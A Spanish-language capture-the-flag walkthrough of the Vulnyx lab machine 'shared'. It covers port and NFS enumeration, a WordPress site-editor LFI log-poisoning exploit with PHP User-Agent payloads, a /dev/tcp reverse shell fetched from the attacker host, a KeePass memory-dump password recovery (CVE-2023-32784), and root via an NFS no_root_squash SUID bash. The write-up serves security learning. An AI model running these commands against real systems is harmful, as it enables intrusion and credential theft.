# Vulnyx
## shared

1. **Escaneo Inicial:**
   - Escaneamos nuestro sistema para identificar la IP víctima:
     ```bash
     arp-scan -I eth0 --localnet
     ```
     Resultado del escaneo ARP:
     ```
     (IP Victima)   08:00:27:59:4d:94       PCS Systemtechnik GmbH
     ```

   - Escaneo de puertos con nmap:
     ```bash
     nmap -p- --min-rate 2000 -sS -sC -sV -n -Pn (IP Victima) -oN nmap
     ```
     Resultados del escaneo:
     ```
     22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
     80/tcp open  http    Apache httpd 2.4.57 (Debian)
     111/tcp open  rpcbind 2-4 (RPC #100000)
     2049/tcp open  nfs_acl 3 (RPC #100227)
     34459/tcp open  nlockmgr 1-4 (RPC #100021)
     40435/tcp open  mountd 1-3 (RPC #100005)
     40643/tcp open  mountd 1-3 (RPC #100005)
     40801/tcp open  mountd 1-3 (RPC #100005)
     44385/tcp open  status  1 (RPC #100024)
     ```

     Dentro del puerto 111, encontramos varias monturas.

2. **Exploración de Monturas NFS:**
   - Mostramos las monturas disponibles:
     ```bash
     showmount -e (IP Victima)
     ```
     Monturas disponibles:
     ```
     /shared/j4ckie *
     /shared/tmp *
     /shared/condor *
     ```

   - Creamos carpetas locales para cada montura:
     ```bash
     mkdir /j4ckie
     mkdir /condor
     mkdir /tmp
     ```

   - Montamos cada montura localmente:
     ```bash
     mount (IP Victima):/shared/j4ckie /j4ckie
     mount (IP Victima):/shared/condor /condor
     mount (IP Victima):/shared/tmp /tmp
     ```

   - Exploramos el contenido de cada montura:
     ```
     /j4ckie: suscribe.txt (https://www.youtube.com/@jackie0x17)
     /condor: suscribe.txt (https://www.youtube.com/@condor0777)
     /tmp: (vacio)
     ```

   - Las monturas nos llevan a los canales de los creadores de la máquina.

3. **Exploración Web - Fuzzing:**
   - Realizamos fuzzing en la web para encontrar posibles rutas:
     ```bash
     wfuzz --hc=404 -u http://(IP Victima)/FUZZ -w /usr/share/dirb/wordlists/big.txt
     ```
     Resultado del fuzzing:
     ```
     /wordpress
     ```

   - Al acceder a "http://(IP Victima)/wordpress", somos redirigidos a "http://shared.nyx/wordpress/". Añadimos la entrada al archivo `/etc/hosts`:
     ```bash
     nano /etc/hosts
     (IP Victima) shared.nyx
     ```

   - Dentro de WordPress, utilizamos WP-scan para obtener información:
     ```bash
     wpscan --url http://shared.nyx/wordpress --enumerate p,u
     ```
     Resultado de WP-scan:
     ```
     WordPress version 6.4.2
     Plugin: site-editor (1.1.1)
     Users: admin
     ```

   - Realizamos fuzzing en WordPress para encontrar rutas por defecto:
     ```bash
     wfuzz --hc=404 -u http://shared.nyx/wordpress/FUZZ -w /usr/share/dirb/wordlists/big.txt
     ```
     Resultado del fuzzing:
     ```
     /backups (bloqueado)
     /wp-admin (login de WordPress)
     /wp-content (en blanco)
     /wp-includes (bloqueado)
     ```

4. **Explotación - Log Poisoning:**
   - Identificamos una vulnerabilidad de log poisoning en WordPress:
     ```bash
     curl -i -v "http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log" -A "<?php system('whoami'); ?>"
     ```

     **Fuentes:** 
   - https://www.exploit-db.com/exploits/44340
   - https://wpscan.com/vulnerability/78575072-4e04-4a8a-baec-f313cfffe829/
   - https://dheerajdeshmukh.medium.com/get-reverse-shell-through-log-poisoning-with-the-vulnerability-of-lfi-local-file-inclusion-e504e2d41f69
   - https://systemweakness.com/log-poisoning-to-remote-code-execution-lfi-curl-7c49be11956

     Al revisar la respuesta, confirmamos la vulnerabilidad.

   - Utilizamos curl para ejecutar comandos al servidor:
     ```bash
     curl -i -v "http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log" -A "<?php system('ls /'); ?>"
     ```

   - Creamos y subimos un archivo para obtener una reverseshell:
     ```bash
     nano rev.php
     # bash -i >& /dev/tcp/(IP-Atacante)/443 0>&1

     python3 -m http.server 8000

     curl -i -v "http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log" -A "<?php system('wget http://(IP atacante):8000/rev.php'); ?>"
     ```

   - Ejecutamos la reverseshell:
     ```bash
     curl -i -v "http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log" -A "<?php system('bash rev.php'); ?>"
     ```

   - Accedemos al servidor con Netcat y obtenemos una shell como www-data.

5. **Privilege Escalation - Rabbit hole - Monturas NFS:**
   - Realizamos tratamiento de la TTY para mayor comodidad:
     ```bash
     script /dev/null -c bash
     control+Z
     stty raw -echo; fg
     reset xterm
     export TERM=xterm
     export SHELL=bash
     ```
   - Comenzamos buscando en "wp-config.php" Una ruta de Wordpress donde suelen haber contraseñas y/o usuarios
     ```bash
     cat wp-config.php
     ```
   - Datos recolectados
     ```bash
     •define( 'DB_NAME', 'wordpress' );
     •define( 'DB_USER', 'wordpress' );
     •define( 'DB_PASSWORD', 'R*****************Y' );
     ```

   - Ingreso a MySQL
     ```bash
     mysql -u wordpress -p
     Password:R******************Y

     SHOW DATABASES;

     +--------------------+
     | Database           |
     +--------------------+
     | information_schema |
     | wordpress          |
     +--------------------+

     SHOW tables FROM wordpress;

     +-----------------------+
     | Tables_in_wordpress   |
     +-----------------------+
     | wp_commentmeta        |
     | wp_comments           |
     | wp_links              |
     | wp_options            |
     | wp_postmeta           |
     | wp_posts              |
     | wp_term_relationships |
     | wp_term_taxonomy      |
     | wp_termmeta           |
     | wp_terms              |
     | wp_usermeta           |
     | wp_users              |
     +-----------------------+

     USE wordpress;

     SELECT * FROM wp_users;


     | 1 | admin | $******************************/ |
     ```

   - Bueno, luego de conseguir ese user y ese pass, descubrimos que no existe lugar útil donde utilizarlo, por lo tanto seguimos buscando. Entre todos los archivos, encontramos un ".zip" que puede interesarnos
     ```bash
     find / -name "*zip" 2>/dev/null
     #/var/www/html/wordpress/backups/cp-sharedbbdd.zip
     ```

   - Descargamos ese archivo, mediante un servidor y Python
     ```bash
     cd /var/www/html/wordpress/backups/cp-sharedbbdd.zip

     python3 -m http.server 5000
     # el puerto 5000 nos exime de permisos
     ```
  
   - Descargamos en nuestra maquina y descomprimimos
     ```bash
     wget (IP-Victima):5000/cp-sharedbbdd.zip

     unzip cp-sharedbbdd.zip
     ```

   - Al descomprimirlo, obtenemos las siguientes carpetas
     ```bash
     •KeePass.DMP
     •sharedbbdd.kdbx
     ``` 

   - Vemos que tenemos un KeePass. Probamos con John the Ripper pero no obtuvimos respuesta. Investigando, damos con un script donde podemos dumpar el password (CVE-2023-32784).

   - https://github.com/dawnl3ss/CVE-2023-32784

     ```bash
     python3 poc.py keepass.DMP
     #●*********%
     ```

   - La primera letra no la identifica, intuimos que es "s*********%" o "S*********%"**

   - Ingresamos al KeePass y encontramos las siguientes pass correspondientes a cada user
     ```bash
     •condor: 		O******************I
     •j4ckie: 		p******************8
     •jackondor: 	7******************9
     ```

   - Ingresamos vía SSH con cada usuario y pass, la que nos da resultados es "jackondor"
     ```bash
     ssh jackondor@192.168.200.17
     pass:7********************9
     ```

   - Y ya estamos dentro como jackondor
     ```bash
     whoami
     #jackondor"
     ```
   - Escala de privilegios

   - Exploramos las monturas y encontramos configuraciones en "exports":
     ```bash
     cat /etc/exports
     ```
     Configuración de monturas:
     ```
     /shared/condor *(rw,sync,no_subtree_check)
     /shared/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
     #/tmp tiene permisos de root
     /shared/j4ckie *(rw,sync,no_subtree_check)
     ```

   - Creamos en la maquina atacante carpeta para monturas en y las montamos en /tmp:
     ```bash
     showmount -e (IP Victima)
     #/shared/tmp *

     mkdir /monturas/tmp

     mount -t nfs (IP atacante):/home/kali/vulnyx/shared/tmp /monturas/tmp

     df -h
     #de esta forma verificamos que se hayan montado con exito
     #(IP-Victima):/shared/tmp 19G 2.7G 15G 16% /home/kali/vulnyx/shared/monturas/tmp
     ```

   - Creamos un archivo bash con permisos de ejecución en la carpeta /tmp local:
     ```bash
     cd /monturas/tmp
     cp /bin/bash .
     chmod +s bash
     ```

   - Verificamos la creación y permisos del archivo en la máquina atacante:
     ```bash
     ls -l /home/kali/vulnyx/shared/tmp
     ```

   - En la máquina víctima, ejecutamos la bash con permisos de root:
     ```bash
     cd /shared/tmp
     ./bash -p
     ```

   - Ahora, en la shell como root, exploramos y obtenemos acceso total al sistema.

   **Ya somos root :D**
